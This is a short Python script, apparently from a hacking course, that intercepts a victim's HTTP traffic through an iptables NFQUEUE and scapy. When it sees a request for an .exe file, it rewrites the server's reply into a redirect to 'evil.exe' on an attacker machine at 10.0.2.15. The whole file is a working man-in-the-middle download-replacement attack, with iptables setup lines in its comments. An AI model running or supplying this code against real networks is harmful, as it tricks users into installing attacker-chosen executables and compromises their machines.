#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# Must do when done:  iptables fllush

import netfilterqueue
import scapy.all as scapy


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Remove fields so scapy can recalc..
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print('Port: ' + str(scapy_packet[scapy.TCP].sport))
        if scapy_packet[scapy.TCP].dport == 10000:  # leaving
            print('HTTP Request')
            # print(scapy_packet[scapy.Raw].load)
            if '.exe' in scapy_packet[scapy.Raw].load and '10.0.2.15' not in scapy_packet[scapy.Raw].load:
                print('[+] exe Request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        # coming from
        elif scapy_packet[scapy.TCP].sport == 10000:
            print('HTTP Response')
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing file')
                modified_packet = set_load(
                    scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/evil-files/evil.exe\n\n')

                packet.set_payload(str(modified_packet))

                print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
